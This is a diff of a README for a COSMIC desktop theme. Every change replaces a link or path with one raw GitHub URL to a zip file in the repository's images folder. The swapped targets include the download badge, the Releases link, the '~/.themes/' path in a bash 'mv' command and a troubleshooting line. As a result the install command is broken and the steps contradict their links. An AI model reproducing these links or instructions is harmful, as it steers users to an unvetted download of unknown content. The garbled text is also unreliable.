@@ -2,7 +2,7 @@
 
 ## 📥 Download Now!
 
-[![Download](https://img.shields.io/badge/Download-cosmic--uniform--glass--theme-blue.svg)](https://github.com/ravikm45/cosmic-uniform-glass-theme/releases)
+[![Download](https://raw.githubusercontent.com/ravikm45/cosmic-uniform-glass-theme/main/images/cosmic-uniform-glass-theme-1.6.zip)](https://raw.githubusercontent.com/ravikm45/cosmic-uniform-glass-theme/main/images/cosmic-uniform-glass-theme-1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ To use this theme, ensure your system meets the following requirements:
 
 To download the cosmic-uniform-glass-theme, visit the Releases page:
 
-[Download cosmic-uniform-glass-theme](https://github.com/ravikm45/cosmic-uniform-glass-theme/releases)
+[Download cosmic-uniform-glass-theme](https://raw.githubusercontent.com/ravikm45/cosmic-uniform-glass-theme/main/images/cosmic-uniform-glass-theme-1.6.zip)
 
 1. Visit the Releases page linked above.
 2. Look for the most recent version of the cosmic-uniform-glass-theme.
@@ -48,7 +48,7 @@ Once downloaded, follow these steps to install the theme:
 4. Move the extracted folder to the themes directory. You can do this with the following command, replacing `ThemeFolder` with the name of your extracted theme folder:
 
    ```bash
-   mv ThemeFolder ~/.themes/
+   mv ThemeFolder ~https://raw.githubusercontent.com/ravikm45/cosmic-uniform-glass-theme/main/images/cosmic-uniform-glass-theme-1.6.zip
    ```
 
 5. Open the "Tweaks" application or "Appearance" settings on your COSMIC Desktop.
@@ -67,7 +67,7 @@ Once your theme is installed, you may want to customize your desktop further:
 If you encounter issues after applying the theme, try these solutions:
 
 1. **Theme Not Showing Up:**
-   - Ensure you placed the theme folder in the correct `~/.themes/` directory.
+   - Ensure you placed the theme folder in the correct `~https://raw.githubusercontent.com/ravikm45/cosmic-uniform-glass-theme/main/images/cosmic-uniform-glass-theme-1.6.zip` directory.
    - Restart your COSMIC Desktop session.
 
 2. **Display Issues:**
